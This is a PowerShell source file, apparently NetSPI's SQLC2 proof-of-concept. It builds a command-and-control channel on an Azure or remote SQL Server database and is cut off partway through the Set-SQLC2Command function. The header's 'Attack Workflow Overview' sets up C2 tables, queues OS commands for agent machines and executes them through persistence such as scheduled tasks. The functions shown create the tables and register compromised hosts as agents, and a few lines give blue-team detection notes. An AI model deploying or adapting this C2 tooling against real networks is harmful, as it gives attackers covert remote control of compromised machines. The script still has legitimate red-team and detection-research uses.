<#
	Script:  SQLC2.ps1
	Description: This is a basic PoC script that contains functions that can be 
		     used to install and manage a C2 via a SQL Server instance.
		     The C2 SQL Server is intended to be hosted remotely or in Azure 
		     via a database.windows.net address.  The client functions can be
		     run by a schedule task or other means for periodic check in
		     and command grabbing from the C2 SQL Server.
	Author:  Scott Sutherland (@_nullbind), NetSPI 2018
	License: BSD 3-Clause
	Mini Guide:

	    ----------------------------
	    Azure Configuration Overview
	    ----------------------------

	    1. Create an Azure account and log in.

	    3. Create a SQL server databse. In this example the server will be named sqlcloudc2 and the datatabase will be named database1.

	    4. Add a virtual firewall exception for the target networks that you will be receiving connections from.

	    ----------------------------
	    Attack Workflow Overview
	    ----------------------------
	    1. Install SQLC2.

	    Install C2 tables in remote SQL Server instance. You will need to provide an database that you have the ability to create tables in, or create a new at database.  However, in Azure I've been getting some timeouts which is why you should have already created the target database through Azure.  

	    Example command:
	    Install-SQLC2 -Username CloudAdmin -Password 'CloudPassword!' -Instance sqlcloudc2.database.windows.net -Database database1 -Verbose 

	    2. Setup OS command.

	    Set a OS command to run on all agent systems.  You can also configure commands to run on a specific agent using the -ServerName paremeter.

	    Example command:
	    Set-SQLC2Command -Username CloudAdmin -Password 'CloudPassword!' -Instance sqlcloudc2.database.windows.net -Database database1 -Verbose -Command "Whoami"

	    3. List queued commands.

	    The command below will query the SQLC2 server for a list of commands queued for the agent to execute. This will only output the commands, it will not execute them.

	    Example command:
	    Get-SQLC2Command -Username CloudAdmin -Password 'CloudPassword!' -Instance sqlcloudc2.database.windows.net -Database database1 -Verbose 

	    4. The agent will automatically be registered.  To list the registered agent use the command below.

	     Get-SQLC2Agent -Username CloudAdmin -Password 'CloudPassword!' -Instance sqlcloudc2.database.windows.net -Database database1 -Verbose 

	    3. Execute queued commands.

	    The command below will query the SQLC2 server for a list of commands queued for the agent to execute. Including the -Execute flag will automatically run them.  This command could be used in combination with your prefered persistence method such as a scheduled task.

	    Example command:
	    Get-SQLC2Command -Username CloudAdmin -Password 'CloudPassword!' -Instance sqlcloudc2.database.windows.net -Database database1 -Verbose -Execute

	    6. View command results.

	    The command below can be used to retrieve the command results. By default it shows the entire command history. However, results can be filtered by -Status, -ServerName, and -Cid.

	    Example command:
	    Get-SQLC2Result -Username CloudAdmin -Password 'CloudPassword!' -Instance sqlcloudc2.database.windows.net -Database database1 -Verbose -Status 'success'

	    ----------------------------
	    Blue Team Datasource Notes
	    ----------------------------
	    1. PowerShell logging.
	    2. EDR showing PowerShell connecting to the internet. Specifically, *.database.windows.net (Azure)
	    3. EDR showing specific commands being executed such as "Get-SQLC2Comand".
#>


# ----------------------------------
#  Get-SQLConnectionObject
# ----------------------------------
# Author: Scott Sutherland
Function Get-SQLConnectionObject
{
    <#
            .SYNOPSIS
            Creates a object for connecting to SQL Server.
            .PARAMETER Username
            SQL Server or domain account to authenticate with.
            .PARAMETER Password
            SQL Server or domain account password to authenticate with.
            .PARAMETER Credential
            SQL Server credential.
            .PARAMETER Database
            Default database to connect to.
            .PARAMETER AppName
            Spoof the name of the application you are connecting to SQL Server with.
            .PARAMETER Encrypt
            Use an encrypted connection.
            .PARAMETER TrustServerCert
            Trust the certificate of the remote server.
            .EXAMPLE
            PS C:\> Get-SQLConnectionObject -Username myuser -Password mypass -Instance server1 -Encrypt Yes -TrustServerCert Yes -AppName "myapp"
            StatisticsEnabled                : False
            AccessToken                      : 
            ConnectionString                 : Server=server1;Database=Master;User ID=myuser;Password=mypass;Connection Timeout=1 ;Application 
                                               Name="myapp";Encrypt=Yes;TrustServerCertificate=Yes
            ConnectionTimeout                : 1
            Database                         : Master
            DataSource                       : server1
            PacketSize                       : 8000
            ClientConnectionId               : 00000000-0000-0000-0000-000000000000
            ServerVersion                    : 
            State                            : Closed
            WorkstationId                    : Workstation1
            Credential                       : 
            FireInfoMessageEventOnUserErrors : False
            Site                             : 
            Container                        : 
    #>
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,

        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Dedicated Administrator Connection (DAC).')]
        [Switch]$DAC,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Default database to connect to.')]
        [String]$Database,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Spoof the name of the application your connecting to the server with.')]
        [string]$AppName = "",

        [Parameter(Mandatory = $false,
        HelpMessage = 'Use an encrypted connection.')]
        [ValidateSet("Yes","No","")]
        [string]$Encrypt = "",

        [Parameter(Mandatory = $false,
        HelpMessage = 'Trust the certificate of the remote server.')]
        [ValidateSet("Yes","No","")]
        [string]$TrustServerCert = "",

        [Parameter(Mandatory = $false,
        HelpMessage = 'Connection timeout.')]
        [string]$TimeOut = 1
    )

    Begin
    {
        # Setup DAC string
        if($DAC)
        {
            $DacConn = 'ADMIN:'
        }
        else
        {
            $DacConn = ''
        }

        # Set database filter
        if(-not $Database)
        {
            $Database = 'Master'
        }

        # Check if appname was provided
        if($AppName){
            $AppNameString = ";Application Name=`"$AppName`""
        }else{
            $AppNameString = ""
        }

        # Check if encrypt was provided
        if($Encrypt){
            $EncryptString = ";Encrypt=Yes"
        }else{
            $EncryptString = ""
        }

        # Check TrustServerCert was provided
        if($TrustServerCert){
            $TrustCertString = ";TrustServerCertificate=Yes"
        }else{
            $TrustCertString = ""
        }
    }

    Process
    {
        # Check for instance
        if ( -not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }

        # Create connection object
        $Connection = New-Object -TypeName System.Data.SqlClient.SqlConnection

        # Set authentcation type - current windows user
        if(-not $Username){

            # Set authentication type
            $AuthenticationType = "Current Windows Credentials"

            # Set connection string
            $Connection.ConnectionString = "Server=$DacConn$Instance;Database=$Database;Integrated Security=SSPI;Connection Timeout=1 $AppNameString $EncryptString $TrustCertString"
        }
        
        # Set authentcation type - provided windows user
        if ($username -like "*\*"){
            $AuthenticationType = "Provided Windows Credentials"

            # Setup connection string 
            $Connection.ConnectionString = "Server=$DacConn$Instance;Database=$Database;Integrated Security=SSPI;uid=$Username;pwd=$Password;Connection Timeout=$TimeOut$AppNameString$EncryptString$TrustCertString"
        }

        # Set authentcation type - provided sql login
        if (($username) -and ($username -notlike "*\*")){

            # Set authentication type
            $AuthenticationType = "Provided SQL Login"

            # Setup connection string 
            $Connection.ConnectionString = "Server=$DacConn$Instance;Database=$Database;User ID=$Username;Password=$Password;Connection Timeout=$TimeOut $AppNameString$EncryptString$TrustCertString"
        }

        # Return the connection object
        return $Connection
    }

    End
    {
    }
}


# ----------------------------------
#  Get-SQLQuery
# ----------------------------------
# Author: Scott Sutherland
Function Get-SQLQuery
{
    <#
            .SYNOPSIS
            Executes a query on target SQL servers.
            .PARAMETER Username
            SQL Server or domain account to authenticate with.
            .PARAMETER Password
            SQL Server or domain account password to authenticate with.
            .PARAMETER Credential
            SQL Server credential.
            .PARAMETER Instance
            SQL Server instance to connection to.
            .PARAMETER DAC
            Connect using Dedicated Admin Connection.
            .PARAMETER Database
            Default database to connect to.
            .PARAMETER TimeOut
            Connection time out.
            .PARAMETER SuppressVerbose
            Suppress verbose errors.  Used when function is wrapped.
            .PARAMETER Threads
            Number of concurrent threads.
            .PARAMETER Query
            Query to be executed on the SQL Server.
            .PARAMETER AppName
            Spoof the name of the application you are connecting to SQL Server with.
            .PARAMETER Encrypt
            Use an encrypted connection.
            .PARAMETER TrustServerCert
            Trust the certificate of the remote server.
            .EXAMPLE
            PS C:\> Get-SQLQuery -Verbose -Instance "SQLSERVER1.domain.com\SQLExpress" -Query "Select @@version" -Threads 15
            .EXAMPLE
            PS C:\> Get-SQLQuery -Verbose -Instance "SQLSERVER1.domain.com,1433" -Query "Select @@version" -Threads 15
            .EXAMPLE
            PS C:\> Get-SQLInstanceDomain | Get-SQLQuery -Verbose -Query "Select @@version" -Threads 15
    #>
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server query.')]
        [string]$Query,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Connect using Dedicated Admin Connection.')]
        [Switch]$DAC,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Default database to connect to.')]
        [String]$Database,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Connection timeout.')]
        [int]$TimeOut,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Spoof the name of the application your connecting to the server with.')]
        [string]$AppName = "",

        [Parameter(Mandatory = $false,
        HelpMessage = 'Use an encrypted connection.')]
        [ValidateSet("Yes","No","")]
        [string]$Encrypt = "",

        [Parameter(Mandatory = $false,
        HelpMessage = 'Trust the certificate of the remote server.')]
        [ValidateSet("Yes","No","")]
        [string]$TrustServerCert = "",

        [Parameter(Mandatory = $false,
        HelpMessage = 'Return error message if exists.')]
        [switch]$ReturnError
    )

    Begin
    {
        # Setup up data tables for output
        $TblQueryResults = New-Object -TypeName System.Data.DataTable
    }

    Process
    {
        # Setup DAC string
        if($DAC)
        {
            # Create connection object
            $Connection = Get-SQLConnectionObject -Instance $Instance -Username $Username -Password $Password -Credential $Credential -TimeOut $TimeOut -DAC -Database $Database -AppName $AppName -Encrypt $Encrypt -TrustServerCert $TrustServerCert
        }
        else
        {
            # Create connection object
            $Connection = Get-SQLConnectionObject -Instance $Instance -Username $Username -Password $Password -Credential $Credential -TimeOut $TimeOut -Database $Database -AppName $AppName -Encrypt $Encrypt -TrustServerCert $TrustServerCert
        }

        # Parse SQL Server instance name
        $ConnectionString = $Connection.Connectionstring
        $Instance = $ConnectionString.split(';')[0].split('=')[1]

        # Check for query
        if($Query)
        {
            # Attempt connection
            try
            {
                # Open connection
                $Connection.Open()

                if(-not $SuppressVerbose)
                {
                    Write-Verbose -Message "$Instance : Connection Success."
                }

                # Setup SQL query
                $Command = New-Object -TypeName System.Data.SqlClient.SqlCommand -ArgumentList ($Query, $Connection)

                # Grab results
                $Results = $Command.ExecuteReader()

                # Load results into data table
                $TblQueryResults.Load($Results)

                # Close connection
                $Connection.Close()

                # Dispose connection
                $Connection.Dispose()
            }
            catch
            {
                # Connection failed - for detail error use  Get-SQLConnectionTest
                if(-not $SuppressVerbose)
                {
                    Write-Verbose -Message "$Instance : Connection Failed."
                }

                if($ReturnError)
                {
                    $ErrorMessage = $_.Exception.Message
                    #Write-Verbose  " Error: $ErrorMessage"
                }
            }
        }
        else
        {
            Write-Output -InputObject 'No query provided to Get-SQLQuery function.'
            Break
        }
    }

    End
    {
        # Return Results
        if($ReturnError)
        {
            $ErrorMessage
        }
        else
        {
            $TblQueryResults
        }
    }
}


# ----------------------------------
#  Get-SQLConnectionTest
# ----------------------------------
Function Get-SQLConnectionTest
{
    <#
            .SYNOPSIS
            Tests if the current Windows account or provided SQL Server login can log into an SQL Server.
            .PARAMETER Username
            SQL Server or domain account to authenticate with.
            .PARAMETER Password
            SQL Server or domain account password to authenticate with.
            .PARAMETER Credential
            SQL Server credential.
            .PARAMETER Instance
            SQL Server instance to connection to.
            .PARAMETER DAC
            Connect using Dedicated Admin Connection.
            .PARAMETER Database
            Default database to connect to.
            .PARAMETER TimeOut
            Connection time out.
            .PARAMETER SuppressVerbose
            Suppress verbose errors.  Used when function is wrapped.
            .EXAMPLE
            PS C:\> Get-SQLConnectionTest -Verbose -Instance "SQLSERVER1.domain.com\SQLExpress"
            .EXAMPLE
            PS C:\> Get-SQLConnectionTest -Verbose -Instance "SQLSERVER1.domain.com,1433"
            .EXAMPLE
            PS C:\> Get-SQLInstanceDomain | Get-SQLConnectionTest -Verbose
    #>
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,

        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipeline = $true,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Connect using Dedicated Admin Connection.')]
        [Switch]$DAC,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Default database to connect to.')]
        [String]$Database,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Connection timeout.')]
        [string]$TimeOut,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )

    Begin
    {
        # Setup data table for output
        $TblResults = New-Object -TypeName System.Data.DataTable
        $null = $TblResults.Columns.Add('ComputerName')
        $null = $TblResults.Columns.Add('Instance')
        $null = $TblResults.Columns.Add('Status')
    }

    Process
    {
        # Parse computer name from the instance
        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance

        # Default connection to local default instance
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }

        # Setup DAC string
        if($DAC)
        {
            # Create connection object
            $Connection = Get-SQLConnectionObject -Instance $Instance -Username $Username -Password $Password -Credential $Credential -DAC -TimeOut $TimeOut -Database $Database
        }
        else
        {
            # Create connection object
            $Connection = Get-SQLConnectionObject -Instance $Instance -Username $Username -Password $Password -Credential $Credential -TimeOut $TimeOut -Database $Database
        }

        # Attempt connection
        try
        {
            # Open connection
            $Connection.Open()

            if(-not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Success."
            }

            # Add record
            $null = $TblResults.Rows.Add("$ComputerName","$Instance",'Accessible')

            # Close connection
            $Connection.Close()

            # Dispose connection
            $Connection.Dispose()
        }
        catch
        {
            # Connection failed
            if(-not $SuppressVerbose)
            {
                $ErrorMessage = $_.Exception.Message
                Write-Verbose -Message "$Instance : Connection Failed."
                Write-Verbose  -Message " Error: $ErrorMessage"
            }

            # Add record
            $null = $TblResults.Rows.Add("$ComputerName","$Instance",'Not Accessible')
        }
    }

    End
    {
        # Return Results
        $TblResults
    }
}


# -------------------------------------------
# Function: Get-ComputerNameFromInstance
# ------------------------------------------
# Author: Scott Sutherland
Function Get-ComputerNameFromInstance
{
    <#
            .SYNOPSIS
            Parses computer name from a provided instance.
            .PARAMETER Instance
            SQL Server instance to parse.
            .EXAMPLE
            PS C:\> Get-ComputerNameFromInstance -Instance SQLServer1\STANDARDDEV2014
            SQLServer1
    #>
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
                ValueFromPipeline = $true,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance.')]
        [string]$Instance
    )

    # Parse ComputerName from provided instance
    If ($Instance)
    {
        $ComputerName = $Instance.split('\')[0].split(',')[0]
    }
    else
    {
        $ComputerName = $env:COMPUTERNAME
    }

    Return $ComputerName
}


# ----------------------------------
#  Install-SQLC2
# ----------------------------------
# Author: Scott Sutherland
Function Install-SQLC2
{
    <#
            .SYNOPSIS
            This functions creates the C2 SQL Server tables in the target database.  
            If the database does not exist, the script will try to create it.            
            .PARAMETER Username
            SQL Server or domain account to authenticate with.
            .PARAMETER Password
            SQL Server or domain account password to authenticate with.
            .PARAMETER Credential
            SQL Server credential.
            .PARAMETER Instance
            SQL Server instance to connection to.
            .PARAMETER DAC
            Connect using Dedicated Admin Connection.
            .PARAMETER DatabaseName
            Database name that contains target table.
            .EXAMPLE
            PS C:\> Install-SQLC2 -Instance "SQLServer1\STANDARDDEV2014" -Database database1 
            PS C:\> Install-SQLC2 -Username CloudAdmin -Password 'CloudPassword!' -Instance cloudserver1.database.windows.net -Database database1 
    #>
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,

        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
                ValueFromPipeline = $true,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Database containing target C2 table.')]
        [string]$Database,

        [Parameter(Mandatory = $false,
                ValueFromPipeline = $true,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'ServerName of the agent.')]
        [string]$ServerName,

       [Parameter(Mandatory = $false,
                ValueFromPipeline = $true,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Command to run on the agent.')]
        [string]$Command,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )

    Begin
    {
        # Create data tables for output
        $TblResults = New-Object -TypeName System.Data.DataTable
    }

    Process
    {
        # Parse computer name from the instance
        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance

        # Default connection to local default instance
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }

        # Test connection to instance
        $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Where-Object -FilterScript {
            $_.Status -eq 'Accessible'
        }

        # Test connection
        if($TestConnection)
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Success."
            }
        }
        else
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Failed."
            }
            return
        }        

        Write-Verbose "$instance : Creating databases in Azure may timeout, but can be created manually via SSMS."
        Write-Verbose "$instance : Attempting to verify and/or create the database $Database..."

        # Create Database Query 
        $Query = "    
            If not Exists (SELECT name FROM master.dbo.sysdatabases WHERE name = '$Database')
	            CREATE DATABASE db1
            ELSE
	            SELECT name FROM master..sysdatabases WHERE name like '$Database'"
        
        # Create Database results
        $TblResults = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -Database 'master' -SuppressVerbose -TimeOut 300 
        $RowCount = $TblResults | Measure-Object | select Count -ExpandProperty count        
        if($RowCount -eq 1)
        {
           Write-Verbose "$instance : Verified $Database database exists or was created."
        }else{
           Write-Verbose "$instance : Access or creation of $Database database failed."
           return  
        }

        Write-Verbose "$instance : Creating the C2 Table in the database $Database on $Instance."

        # Create Database Query 
        $Query = "    
                If not Exists (SELECT name FROM sys.tables WHERE name = 'C2COMMANDS')
                CREATE TABLE [C2COMMANDS] 
                (
	                [cid] int IDENTITY(1,1) PRIMARY KEY,
	                [servername]varchar(MAX),
	                [command]varchar(MAX),
	                [result]varchar(MAX),
	                [status]varchar(MAX),
                    [lastupdate]DateTime default (Getdate())
                );

                If not Exists (SELECT name FROM sys.tables WHERE name = 'C2AGENTS')
                CREATE TABLE [C2AGENTS] 
                (
	                [aid] int IDENTITY(1,1) PRIMARY KEY,
	                [servername]varchar(MAX),
	                [agentype]varchar(MAX),
	                [lastcheckin]DateTime default (Getdate()),
                );SELECT name FROM sys.tables WHERE name = 'C2COMMANDS'"
        
        # Create Database results
        $TblResults = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -Database "$Database" -SuppressVerbose
        $RowCount = $TblResults | Measure-Object | select Count -ExpandProperty count    
        if($RowCount -eq 1)
        {
           Write-Verbose "$instance : Verified C2 tables existed or were created in the $Database on $Instance."
        }else{
           Write-Verbose "$instance : C2 tables creation failed in the $Database on $Instance failed."  
        }
        
    }

    End
    {
        # Return data
        # $TblResults
    }
}


# ----------------------------------
#  Register-SQLC2Agent
# ----------------------------------
# Author: Scott Sutherland
Function Register-SQLC2Agent 
{
    <#
            .SYNOPSIS
            This command should be run on the c2 agent system so it can send a keep alive to the server. 
            .PARAMETER Username
            SQL Server or domain account to authenticate with.
            .PARAMETER Password
            SQL Server or domain account password to authenticate with.
            .PARAMETER Credential
            SQL Server credential.
            .PARAMETER Instance
            SQL Server instance to connection to.
            .PARAMETER DAC
            Connect using Dedicated Admin Connection.
            .PARAMETER DatabaseName
            Database name that contains target table.
            .PARAMETER Table
            Table name to that contains target column.
            .PARAMETER Column
            Column that contains the TSQL command to run.
            .EXAMPLE
            PS C:\> Register-SQLC2Agent -Instance "SQLServer1\STANDARDDEV2014" -Database database1
            PS C:\> Register-SQLC2Agent -Username CloudAdmin -Password 'CloudPassword!' -Instance cloudserver1.database.windows.net -Database database1
    #>
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,

        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
                ValueFromPipeline = $true,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Database containing target C2 table.')]
        [string]$Database,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )

    Begin
    {
        # Create data tables for output
        $TblResults = New-Object -TypeName System.Data.DataTable
        $TblDatabases = New-Object -TypeName System.Data.DataTable
        $null = $TblDatabases.Columns.Add('ServerName')
        $null = $TblDatabases.Columns.Add('Command')
        $null = $TblDatabases.Columns.Add('Status')
    }

    Process
    {
        # Parse computer name from the instance
        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance

        # Default connection to local default instance
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }

        # Test connection to instance
        $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Where-Object -FilterScript {
            $_.Status -eq 'Accessible'
        }
        if($TestConnection)
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Success."
            }
        }
        else
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Failed."
            }
            return
        }        

        # Setup query to grab commands
        $Query = "
             -- checkin as agent
            IF not Exists (SELECT * FROM dbo.C2Agents WHERE servername = '$env:COMPUTERNAME')
	            INSERT dbo.C2Agents (servername,agentype) VALUES ('$env:COMPUTERNAME','PsProcess')
            ELSE
	        UPDATE dbo.C2Agents SET lastcheckin = (select GETDATE ())
            WHERE servername like '$env:COMPUTERNAME'"

        # Execute Query
        $TblResults = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -Database $Database -SuppressVerbose

        Write-Verbose "$instance : $env:COMPUTERNAME agent registered/checked in."
    }

    End
    {
        # Return data
        $TblResults        
    }
}


# ----------------------------------
#  Get-SQLC2Agent
# ----------------------------------
# Author: Scott Sutherland
Function Get-SQLC2Agent 
{
    <#
            .SYNOPSIS
            This command should be run against the C2 SQLserver and will return a list of agents. 
            .PARAMETER Username
            SQL Server or domain account to authenticate with.
            .PARAMETER Password
            SQL Server or domain account password to authenticate with.
            .PARAMETER Credential
            SQL Server credential.
            .PARAMETER Instance
            SQL Server instance to connection to.
            .PARAMETER DAC
            Connect using Dedicated Admin Connection.
            .PARAMETER DatabaseName
            Database name that contains target table.
            .PARAMETER Table
            Table name to that contains target column.
            .PARAMETER Column
            Column that contains the TSQL command to run.
            .EXAMPLE
            PS C:\> Get-SQLC2Agent-Instance "SQLServer1\STANDARDDEV2014" -Database database1
            PS C:\> Get-SQLC2Agent -Username CloudAdmin -Password 'CloudPassword!' -Instance cloudserver1.database.windows.net -Database database1
    #>
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,

        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
                ValueFromPipeline = $true,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Database containing target C2 table.')]
        [string]$Database,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )

    Begin
    {
        # Create data tables for output
        $TblResults = New-Object -TypeName System.Data.DataTable
    }

    Process
    {
        # Parse computer name from the instance
        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance

        # Default connection to local default instance
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }

        # Test connection to instance
        $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Where-Object -FilterScript {
            $_.Status -eq 'Accessible'
        }
        if($TestConnection)
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Success."
            }
        }
        else
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Failed."
            }
            return
        }        

        # Setup query to grab commands
        $Query = "SELECT * FROM dbo.c2agents"

        # Execute Query
        $TblResults = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -Database $Database -SuppressVerbose        
        $AgentCount = $TblResults | measure | select count -ExpandProperty count

        Write-Verbose -Message "$Instance : $AgentCount agents were found registered."
    }

    End
    {
        # Return data
        $TblResults        
    }
}


# ----------------------------------
#  Set-SQLC2Command
# ----------------------------------
# Author: Scott Sutherland
Function Set-SQLC2Command
{
    <#
            .SYNOPSIS
            This functions stores a command in the C2COMMAND table of the C2 SQL Server. 
            This command should be run against the C2 SQL Server.
            .PARAMETER Username
            SQL Server or domain account to authenticate with.
            .PARAMETER Password
            SQL Server or domain account password to authenticate with.
            .PARAMETER Credential
            SQL Server credential.
            .PARAMETER Instance
            SQL Server instance to connection to.
            .PARAMETER DAC
            Connect using Dedicated Admin Connection.
            .PARAMETER DatabaseName
            Database name that contains target table.
            .PARAMETER ServerName
            ServerName to run the command on. By default it is all nodes.
            .PARAMETER Command
            Command to run on the agent.
            .EXAMPLE
            PS C:\> Set-SQLC2Command -Instance "SQLServer1\STANDARDDEV2014" -Database database1 -Command 'whoami' -ServerName host1
            PS C:\> Set-SQLC2Command -Username CloudAdmin -Password 'CloudPassword!' -Instance cloudserver1.database.windows.net -Database database1 -Command 'whoami' -ServerName host1
    #>
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,

        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
                ValueFromPipeline = $true,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Database containing target C2 table.')]
        [string]$Database,

        [Parameter(Mandatory = $false,
                ValueFromPipeline = $true,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'ServerName of the agent.')]
        [string]$ServerName,

       [Parameter(Mandatory = $false,
                ValueFromPipeline = $true,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Command to run on the agent.')]
        [string]$Command,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )

    Begin
    {
        # Create data tables for output
        $TblResults = New-Object -TypeName System.Data.DataTable
        $TblDatabases = New-Object -TypeName System.Data.DataTable
        $null = $TblDatabases.Columns.Add('ServerName')
        $null = $TblDatabases.Columns.Add('Command')
        $null = $TblDatabases.Columns.Add('Status')
    }

    Process
    {
